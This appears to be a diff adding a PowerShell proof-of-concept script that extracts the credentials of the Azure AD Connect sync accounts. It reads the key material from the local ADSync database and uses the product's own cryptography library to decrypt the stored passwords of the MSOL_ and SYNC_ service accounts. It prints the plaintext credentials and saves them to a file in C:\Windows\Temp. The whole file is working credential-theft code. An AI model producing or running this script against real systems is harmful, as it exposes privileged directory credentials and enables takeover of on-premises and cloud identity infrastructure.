@@ -1,0 +1,91 @@
+Write-Host "AD Connect Sync Credential Extract POC (MSOL + SYNC)`n"
+
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
+$client.Open()
+
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$key_id = $reader.GetInt32(0)
+$instance_id = $reader.GetGuid(1)
+$entropy = $reader.GetGuid(2)
+$reader.Close()
+
+add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+$key2 = $null
+$km.GetKey(1, [ref]$key2)
+
+# ===== EXTRACT MSOL (AD Connector) =====
+Write-Host "=== MSOL_xxx Account (AD Connector) ===" 
+
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$config = $reader.GetString(0)
+$crypted = $reader.GetString(1)
+$reader.Close()
+
+$decrypted = $null
+$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+
+$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
+$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
+
+Write-Host ("Domain: " + $domain.Domain)
+Write-Host ("Username: " + $username.Username)
+Write-Host ("Password: " + $password.Password)
+
+$msol_creds = @"
+=== MSOL_xxx CREDENTIALS ===
+Domain: $($domain.Domain)
+Username: $($username.Username)
+Password: $($password.Password)
+"@
+
+# ===== EXTRACT SYNC_xxx (Azure AD Connector) =====
+Write-Host "`n=== SYNC_xxx Account (Azure AD Connector) ==="
+
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'Windows Azure AD'"
+$reader = $cmd.ExecuteReader()
+
+if ($reader.Read()) {
+    $config_azure = $reader.GetString(0)
+    $crypted_azure = $reader.GetString(1)
+    $reader.Close()
+    
+    $decrypted_azure = $null
+    $key2.DecryptBase64ToString($crypted_azure, [ref]$decrypted_azure)
+    
+    $sync_username = select-xml -Content $config_azure -XPath "//parameter[@name='UserName']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+    $sync_password = select-xml -Content $decrypted_azure -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
+    
+    Write-Host ("Username: " + $sync_username.Username)
+    Write-Host ("Password: " + $sync_password.Password)
+    
+    $sync_creds = @"
+
+=== SYNC_xxx CREDENTIALS ===
+Username: $($sync_username.Username)
+Password: $($sync_password.Password)
+"@
+}
+else {
+    Write-Host "No Azure AD connector found"
+    $sync_creds = "`n=== SYNC_xxx CREDENTIALS ===`nNot found"
+    $reader.Close()
+}
+
+# ===== Save both to file =====
+$all_creds = $msol_creds + $sync_creds
+$all_creds | Out-File -FilePath "C:\Windows\Temp\adconnect_creds_all.txt" -Encoding ASCII
+Write-Host "`n✓ Credentials saved to C:\Windows\Temp\adconnect_creds_all.txt"
+
+$client.Close()
